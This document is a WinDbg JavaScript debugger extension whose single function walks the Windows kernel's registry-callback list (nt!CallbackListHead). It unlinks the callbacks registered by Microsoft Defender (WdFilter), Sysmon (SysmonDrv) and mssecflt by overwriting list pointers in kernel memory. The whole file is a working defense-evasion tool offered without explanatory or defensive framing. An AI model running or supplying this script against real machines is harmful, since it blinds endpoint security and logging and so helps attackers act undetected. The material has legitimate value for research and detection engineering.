"use strict";

function zeroDefensiveRegistryCallbacks() {
    const log = x => host.diagnostics.debugLog(x + "\n");
    const ctl = host.namespace.Debugger.Utility.Control;

    const targets = ["WdFilter", "SysmonDrv", "mssecflt"];

    log("[*] Walking nt!CallbackListHead - Unlinking defensive registry callbacks\n");

    // Get head address
    let headAddrRes = ctl.ExecuteCommand("? nt!CallbackListHead");
    let headAddr = "";
    for (let l of headAddrRes) {
        let match = l.match(/=\s+([0-9a-f`]+)/i);
        if (match) {
            headAddr = match[1].replace(/`/g, "");
            break;
        }
    }

    if (!headAddr) {
        log("[-] Failed to resolve nt!CallbackListHead");
        return;
    }

    log("[*] CallbackListHead: 0x" + headAddr);

    // Get first Flink
    let headRes = ctl.ExecuteCommand("dqs nt!CallbackListHead L1");
    let flink = "";
    for (let l of headRes) {
        let parts = l.trim().split(/\s+/);
        if (parts.length >= 2) {
            flink = parts[1].replace(/`/g, "");
            break;
        }
    }

    log("[*] Head Flink: 0x" + flink + "\n");

    let current = flink;
    let count = 0;
    let maxIter = 64;

    while (count < maxIter) {

        if (current === headAddr) {
            log("[*] Reached list head - done.\n");
            break;
        }

        // Read 7 QWORDs from entry
        // index 0 = Flink   (offset 0x00)
        // index 1 = Blink   (offset 0x08)
        // index 4 = Pre CB  (offset 0x20)
        // index 5 = Post CB (offset 0x28)
        let dpsRes = ctl.ExecuteCommand("dqs 0x" + current + " L7");
        let lines = [];
        for (let l of dpsRes) {
            let trimmed = l.trim();
            if (trimmed.length > 0) lines.push(trimmed);
        }

        let nextFlink = "";
        let blink     = "";
        let callback  = "";

        for (let i = 0; i < lines.length; i++) {
            let parts = lines[i].split(/\s+/);
            if (parts.length < 2) continue;
            let val = parts[1].replace(/`/g, "");
            let sym = parts.slice(2).join(" ");
            let display = val + (sym ? " " + sym : "");

            if (i === 0) nextFlink = val;
            if (i === 1) blink     = val;
            if (i === 4 && !val.startsWith("0000000000000000")) callback = display;
            if (i === 5 && !val.startsWith("0000000000000000")) callback = display;
        }

        log("[" + count + "] Entry: 0x" + current + "  Callback: " + callback);

        // Check if target
        let isTarget = false;
        for (let t of targets) {
            if (callback.toLowerCase().indexOf(t.toLowerCase()) !== -1) {
                isTarget = true;
                break;
            }
        }

        if (isTarget) {
            log("    [!] Target found - unlinking entry 0x" + current);

            // Unlink: set prev->Flink = current->Flink
            //         set next->Blink = current->Blink
            // i.e. blink->Flink = nextFlink
            //      nextFlink->Blink = blink

            let blinkFlinkAddr = blink;           // Flink is at offset 0 of blink entry
            let nextBlinkAddr  = nextFlink + "8"; // Blink is at offset 0x8 of next entry

            // blink->Flink = nextFlink
            ctl.ExecuteCommand("eq 0x" + blinkFlinkAddr + " 0x" + nextFlink);
            log("    [+] Set blink->Flink (0x" + blinkFlinkAddr + ") = 0x" + nextFlink);

            // next->Blink = blink
            let nextBlinkOffset = "";
            let nextBlinkRes = ctl.ExecuteCommand("? 0x" + nextFlink + " + 0x8");
            for (let l of nextBlinkRes) {
                let match = l.match(/=\s+([0-9a-f`]+)/i);
                if (match) {
                    nextBlinkOffset = match[1].replace(/`/g, "");
                    break;
                }
            }

            ctl.ExecuteCommand("eq 0x" + nextBlinkOffset + " 0x" + blink);
            log("    [+] Set next->Blink (0x" + nextBlinkOffset + ") = 0x" + blink);
            log("    [+] Entry unlinked.\n");
        }

        if (!nextFlink || nextFlink === "0000000000000000") break;
        current = nextFlink;
        count++;
    }

    log("[*] Done.");
}

function initializeScript() {
    return [
        new host.functionAlias(zeroDefensiveRegistryCallbacks, "zeroDefensiveRegistryCallbacks")
    ];
}
